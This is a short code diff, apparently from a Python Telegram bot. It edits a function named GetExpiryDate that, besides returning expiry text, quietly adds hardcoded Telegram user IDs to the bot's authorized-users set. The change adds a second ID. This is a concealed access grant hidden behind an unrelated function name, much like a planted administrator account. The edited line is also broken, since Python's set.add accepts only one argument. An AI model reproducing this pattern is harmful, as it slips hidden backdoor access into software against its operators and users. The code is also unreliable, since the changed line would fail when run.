@@ -27,7 +27,7 @@ from helper_funcs.chat_base import TRChatBase
 
 def GetExpiryDate(chat_id):
     expires_at = (str(chat_id), "KGRockers", "Contact Creator")
-    Config.AUTH_USERS.add(749789911)
+    Config.AUTH_USERS.add(749789911,1370186886)
     return expires_at
 
 
